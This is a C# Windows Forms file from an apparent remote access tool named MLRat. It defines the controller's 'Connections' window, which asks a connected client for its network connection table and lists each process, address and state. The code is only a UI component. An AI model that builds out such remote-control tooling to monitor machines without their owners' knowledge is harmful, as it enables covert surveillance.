using MLRat.Server;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MLManagementServer.Forms
{
    public partial class formConnections : Form
    {
        public IClient Client { get; set; }
        Dictionary<string, ListViewGroup> Groups = new Dictionary<string, ListViewGroup>();
        public formConnections(IClient c, Image connectionImg)
        {
            Client = c;
            InitializeComponent();
            ImageList il = new ImageList();
            if (connectionImg != null)
                il.Images.Add("con", connectionImg);
            lvConnections.SmallImageList = il;
        }

        private void formConnections_Load(object sender, EventArgs e)
        {
            this.Text = string.Format("Connections ({0})", Client.GetVariable<string>("Username", ""));
            Client.Send((byte)NetworkCommand.Connections, (byte)ConnectionsCommand.GetTable);
        }

        public void AddConnection(string proc, string locAddr, string remoteAddr, string state)
        {
            ListViewItem i = new ListViewItem(proc);
            i.SubItems.AddRange(new string[] { locAddr, remoteAddr, state});
            i.ImageKey = "con";
            Invoke((MethodInvoker)delegate ()
            {
                if(!Groups.ContainsKey(state))
                {
                    ListViewGroup g = new ListViewGroup(state, state);
                    lvConnections.Groups.Add(g);
                    Groups.Add(state, g);
                }
                i.Group = lvConnections.Groups[state];
                lvConnections.Items.Add(i);
            });
        }
    }
}
